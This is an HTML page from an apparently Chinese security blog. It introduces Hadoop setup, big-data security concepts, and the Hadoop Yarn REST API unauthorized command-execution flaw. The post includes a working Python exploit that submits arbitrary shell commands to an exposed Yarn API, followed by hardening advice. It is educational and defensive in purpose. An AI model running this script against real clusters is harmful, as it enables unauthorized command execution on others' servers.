@@ -1,0 +1,1281 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Security,大数据,Hadoop," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="BlackWolf's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/static/picture/icon.jpg?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="0x00前言近期入门大数据安全，分享一下Win10搭建Hadoop问题、相关安全概念和Hadoop Yarn REST API未授权命令执行漏洞">
+<meta name="keywords" content="Security,大数据,Hadoop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="大数据安全入门-Hadoop">
+<meta property="og:url" content="http://blackwolfsec.cc/2018/09/29/Hadoop/index.html">
+<meta property="og:site_name" content="BlackWolf&#39;s Blog">
+<meta property="og:description" content="0x00前言近期入门大数据安全，分享一下Win10搭建Hadoop问题、相关安全概念和Hadoop Yarn REST API未授权命令执行漏洞">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-09-29T12:59:09.256Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="大数据安全入门-Hadoop">
+<meta name="twitter:description" content="0x00前言近期入门大数据安全，分享一下Win10搭建Hadoop问题、相关安全概念和Hadoop Yarn REST API未授权命令执行漏洞">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blackwolfsec.cc/2018/09/29/Hadoop/"/>
+
+
+
+
+
+  <title>大数据安全入门-Hadoop | BlackWolf's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BlackWolf's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">silence & hear</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            我的简历
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2018/09/29/Hadoop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="邮箱地址：admin@blackwolfsec.cc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/static/picture/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BlackWolf's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">大数据安全入门-Hadoop</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T20:51:33+08:00">
+                2018-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/大数据/" itemprop="url" rel="index">
+                    <span itemprop="name">大数据</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>近期入门大数据安全，分享一下Win10搭建Hadoop问题、相关安全概念和Hadoop Yarn REST API未授权命令执行漏洞<br><a id="more"></a></p>
+<h3 id="0x01环境安装"><a href="#0x01环境安装" class="headerlink" title="0x01环境安装"></a>0x01环境安装</h3><ul>
+<li><strong>1.win10安装Hadoop集群</strong><br>参考链接<a href="https://github.com/MuhammadBilalYar/Hadoop-On-Window/wiki/Step-by-step-Hadoop-2.8.0-installation-on-Window-10" target="_blank" rel="noopener">Step-by-step-Hadoop-2.8.0-installation-on-Window-10</a></li>
+</ul>
+<p>注意事项：hadoop-env.cmd文件中JAVA_HOME需要用双引号包裹，而且路径不能包括空格，否则报错：<br><code>set JAVA_HOME=&quot;C:\jdk1.8.0_171&quot;</code></p>
+<ul>
+<li><p><strong>2.Docker快速搭建Hadoop集群</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -P sequenceiq/hadoop-docker</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>3.Hadoop入门”hello world”之MapReduce计数案例</strong><br><a href="https://github.com/MuhammadBilalYar/Hadoop-On-Window/wiki/How-to-Run-Hadoop-wordcount-MapReduce-Example-on-Windows-10" target="_blank" rel="noopener">How to Run Hadoop wordcount MapReduce Example on Windows 10</a></p>
+</li>
+</ul>
+<h3 id="0x01基本概念"><a href="#0x01基本概念" class="headerlink" title="0x01基本概念"></a>0x01基本概念</h3><ul>
+<li>大数据具备<strong>4V</strong>的特征，即：variety（多样化）、volume（海量化）、velocity（快速化）、value（价值低密度）</li>
+<li><strong>传输交换安全</strong>是指保障与外部系统交换数据过程的安全可控，需要采用接口鉴权等机制，对外部系统的合法性进行验证，采用通道加密等手段保障传输过程的机密性和完整性。</li>
+<li><strong>存储安全</strong>是指对平台中的数据设置备份与恢复机制，并采用数据访问控制机制来防止数据的越权访问。计算组件应提供相应的身份认证和访问控制机制，确保只有合法的用户或应用程序才能发起数据处理请求。</li>
+<li><strong>平台管理安全</strong>包括平台组件的安全配置、资源安全调度、补丁管理、安全审计等内容。此外，平台软硬件基础设施的物理安全、网络安全、虚拟化安全等是大数据平台安全运行的基础</li>
+<li>数据“可用不可见”，是大数据环境下数据安全的新需求</li>
+</ul>
+<h3 id="0x02安全威胁与技术"><a href="#0x02安全威胁与技术" class="headerlink" title="0x02安全威胁与技术"></a>0x02安全威胁与技术</h3><ul>
+<li><strong>数据的真实性和完整性校验困难</strong>。黑客利用网络攻击向数据采集端注入脏数据，会破坏数据真实性，故意将数据分析的结果引向预设的方向，进而实现操纵分析结果的攻击目的</li>
+<li><strong>大数据DLP 防护技术</strong>：针对使用泄露和存储泄露，通常采用身份认证管理、进程监控、日志分析和安全审计等技术手段，观察和记录操作员对计算机、文件、软件和数据的操作情况，发现、识别、监控计算机中的敏感数据的使用和流动，对敏感数据的违规使用进行警告、阻断等。针对传输泄露，通常采取敏感数据动态识别、动态加密、访问阻断、和数据库防火墙等技术，监控服务器、终端以及网络中动态传输的敏感数据，发现和阻止敏感数据通过聊天工具、网盘、微博、FTP、论坛等方式泄露出去</li>
+<li><strong>密文计算技术</strong>：同态加密和安全多方计算等密文计算方法（SMPC）为解决这个难题<br>提供了一种有效的解决思路</li>
+</ul>
+<ol>
+<li><strong>同态加密</strong>提供了一种对加密数据进行处理的功能，对经过同态加密的数据处理得到一个输出，将这一输出进行解密，其结果与统一方法处理未加密的原始数据得到的输出结果一致。</li>
+<li><strong>安全多方计算</strong>（SecureMulti-PartyComputation, SMPC）是解决一组互不信任的参与方之间保护隐私的协同计算问题，SMPC要确保输入的独立性，计算的正确性，同时不泄露各输入值给参与计算的其他成员。</li>
+</ol>
+<ul>
+<li><strong>数字水印和数据血缘追踪技术</strong></li>
+</ul>
+<ol>
+<li><strong>数字水印技术</strong>是为了保持对分发后的数据流向追踪，在数据泄露行为发生后，对造成数据泄露的源头可进行回溯</li>
+<li><strong>数据血缘</strong>(Lineage，Provenance，Pedigree)亦可译为血统、起源、世系、谱系，是指数据产生的链路，数据血缘记载了对数据处理的整个历史，包括数据的起源和处理这些数据的所有后继过程。</li>
+</ol>
+<ul>
+<li><strong>数据脱敏技术</strong></li>
+</ul>
+<ol>
+<li>第一种加密方法，是指标准的加密算法，加密后完全失去业务属性，属于低层次脱敏。算法开销大，适用于机密性要求高、不需要保持业务属性的场景。</li>
+<li>第二种基于数据失真的技术，最常用的是随机干扰、乱序等，是不可逆算法，通过这种算法可以生成“看起来很真实的假数据”。适用于群体信息统计或（和）需要保持业务属性的场景。</li>
+<li>第三种可逆的置换算法，兼具可逆和保证业务属性的特征，可以通过位置变换、表映射、算法映射等方式实现。</li>
+</ol>
+<ul>
+<li><strong>数据匿名化算法</strong>可以实现根据具体情况有条件地发布部分数据，或者数据的部分属性内容，包括差分隐私、K 匿名、L 多样性、T 接近等</li>
+</ul>
+<h3 id="0x03Hadoop-Yarn-REST-API未授权命令执行漏洞检测"><a href="#0x03Hadoop-Yarn-REST-API未授权命令执行漏洞检测" class="headerlink" title="0x03Hadoop Yarn REST API未授权命令执行漏洞检测"></a>0x03Hadoop Yarn REST API未授权命令执行漏洞检测</h3><ul>
+<li>参考链接：<a href="https://paper.seebug.org/611/" target="_blank" rel="noopener">Hadoop Yarn REST API 未授权漏洞利用挖矿分析</a><h4 id="1-漏洞检测"><a href="#1-漏洞检测" class="headerlink" title="1.漏洞检测"></a>1.漏洞检测</h4>使用curl不是很方便，于是写一个无缝支持python2和python3的脚本进行漏洞检测.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser </span><br><span class="line"></span><br><span class="line">is_py2 = (sys.version_info[<span class="number">0</span>] == <span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> is_py2:</span><br><span class="line">    <span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_application_id</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    url=<span class="string">'http://%s:%s/ws/v1/cluster/apps/new-application'</span> % (ip,port)</span><br><span class="line">    <span class="keyword">if</span> is_py2:</span><br><span class="line">            request = urllib2.Request(url=url,data=<span class="string">""</span>)</span><br><span class="line">            html = urllib2.urlopen(request)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            request = urllib.request.Request(url=url,data=<span class="string">""</span>.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">            html= urllib.request.urlopen(request)</span><br><span class="line">    status_code=html.code</span><br><span class="line">    <span class="keyword">if</span> status_code==<span class="number">200</span>:</span><br><span class="line">        data=json.loads(html.readline())</span><br><span class="line">        app_id=data[<span class="string">'application-id'</span>]</span><br><span class="line">        <span class="keyword">return</span> app_id</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_color(<span class="string">'[-] Get application-id error ! '</span>,<span class="string">'red'</span>)</span><br><span class="line">        print_color(html.readline(),<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excute_cmd</span><span class="params">(ip,port,command,app_id)</span>:</span></span><br><span class="line">    url=<span class="string">'http://%s:%s/ws/v1/cluster/apps'</span> % (ip,port)</span><br><span class="line">    payload=&#123; <span class="string">"am-container-spec"</span>:&#123;<span class="string">"commands"</span>:&#123;<span class="string">"command"</span>:command&#125;&#125;,  <span class="string">"application-id"</span>:app_id, <span class="string">"application-name"</span>:<span class="string">"test"</span>, <span class="string">"application-type"</span>:<span class="string">"YARN"</span>  &#125;</span><br><span class="line">    <span class="keyword">if</span> is_py2:</span><br><span class="line">            request = urllib2.Request(url=url,data=json.dumps(payload))</span><br><span class="line">            request.add_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">            html = urllib2.urlopen(request)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            request = urllib.request.Request(url=url,data=json.dumps(payload).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            request.add_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">            html= urllib.request.urlopen(request)</span><br><span class="line">    status_code=html.code</span><br><span class="line">    <span class="keyword">if</span> status_code==<span class="number">202</span>:</span><br><span class="line">        print_color(<span class="string">'[+] The command may be executed successfully.'</span>,<span class="string">'blue'</span>)</span><br><span class="line">        <span class="keyword">return</span> app_id</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_color(<span class="string">'[-] error ! '</span>,<span class="string">'red'</span>)</span><br><span class="line">        print_color(html.readline(),<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_color</span><span class="params">(data,color=<span class="string">"white"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> color == <span class="string">'green'</span>: print(<span class="string">'\033[1;32m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color == <span class="string">'blue'</span> : print(<span class="string">'\033[1;34m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'gray'</span> : print(<span class="string">'\033[1;30m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'red'</span> : print(<span class="string">'\033[1;31m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'yellow'</span> : print(<span class="string">'\033[1;33m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'magenta'</span> : print(<span class="string">'\033[1;35m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'cyan'</span> : print(<span class="string">'\033[1;36m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'white'</span> : print(<span class="string">'\033[1;37m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">elif</span> color==<span class="string">'crimson'</span> : print(<span class="string">'\033[1;38m%s\033[1;m'</span> % data)</span><br><span class="line">    <span class="keyword">else</span> : print(data)</span><br><span class="line"></span><br><span class="line">logo=<span class="string">'''An Hadoop Yarn REST API unauthorized RCE checker, which supports python2 and python3'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print_color(logo,<span class="string">'green'</span>)</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"--ip"</span>, dest=<span class="string">"ip"</span>,  help=<span class="string">"IP addresses for Hadoop Yarn REST API. Ex: 127.0.0.1"</span>)</span><br><span class="line">    parser.add_option(<span class="string">"-p"</span>,<span class="string">"--port"</span>,dest=<span class="string">"port"</span>,default=<span class="string">"8088"</span>,  help=<span class="string">"The port for Hadoop Yarn REST API, default：8088"</span>)</span><br><span class="line">    parser.add_option(<span class="string">"-c"</span>,<span class="string">"--command"</span>, dest=<span class="string">"command"</span>, default=<span class="string">"whoami &gt; /tmp/hacked.txt"</span>,help=<span class="string">'Command to execute,default: "whoami &gt; /tmp/hacked.txt"'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> options.ip:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line">    app_id=get_application_id(options.ip,options.port)</span><br><span class="line">    excute_cmd(options.ip,options.port,options.command,app_id)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><ul>
+<li>通过iptables或者安全组配置访问策略，限制对8088等端口的访问</li>
+<li>尽量不要将接口开放在公网，改为本地或者内网调用</li>
+<li>使用最新版Hadoop并启用Kerberos认证功能，禁止匿名访</li>
+</ul>
+<p>提示:<br>本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Security/" rel="tag"># Security</a>
+          
+            <a href="/tags/大数据/" rel="tag"># 大数据</a>
+          
+            <a href="/tags/Hadoop/" rel="tag"># Hadoop</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/10/online-checker/" rel="next" title="online-checker基于python实现的批量URL在线存活检测工具">
+                <i class="fa fa-chevron-left"></i> online-checker基于python实现的批量URL在线存活检测工具
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/static/picture/logo.jpg"
+               alt="邮箱地址：admin@blackwolfsec.cc" />
+          <p class="site-author-name" itemprop="name">邮箱地址：admin@blackwolfsec.cc</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">52</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">49</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://anquanquan.info" target="_blank" title="安全圈">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  安全圈
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://das.scusec.org/" target="_blank" title="小黑屋">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  小黑屋
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.ourren.com/" target="_blank" title="ourren">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  ourren
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://wps2015.org/" target="_blank" title="wps2015">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  wps2015
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://ohroot.com/" target="_blank" title="半饱和">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  半饱和
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.mauu.me/" target="_blank" title="ksss'blog">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  ksss'blog
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://ecma.io/" target="_blank" title="该隐">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  该隐
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sccsec.com" target="_blank" title="胖胖的博客">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  胖胖的博客
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://phantom0301.cc/" target="_blank" title="零の杂货铺">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  零の杂货铺
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://syean.cn/" target="_blank" title="我是_一棵树_">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  我是_一棵树_
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00前言"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01环境安装"><span class="nav-number">2.</span> <span class="nav-text">0x01环境安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01基本概念"><span class="nav-number">3.</span> <span class="nav-text">0x01基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02安全威胁与技术"><span class="nav-number">4.</span> <span class="nav-text">0x02安全威胁与技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03Hadoop-Yarn-REST-API未授权命令执行漏洞检测"><span class="nav-number">5.</span> <span class="nav-text">0x03Hadoop Yarn REST API未授权命令执行漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-漏洞检测"><span class="nav-number">5.1.</span> <span class="nav-text">1.漏洞检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安全加固"><span class="nav-number">5.2.</span> <span class="nav-text">安全加固</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">邮箱地址：admin@blackwolfsec.cc</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="http://blackwolfsec.cc/">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
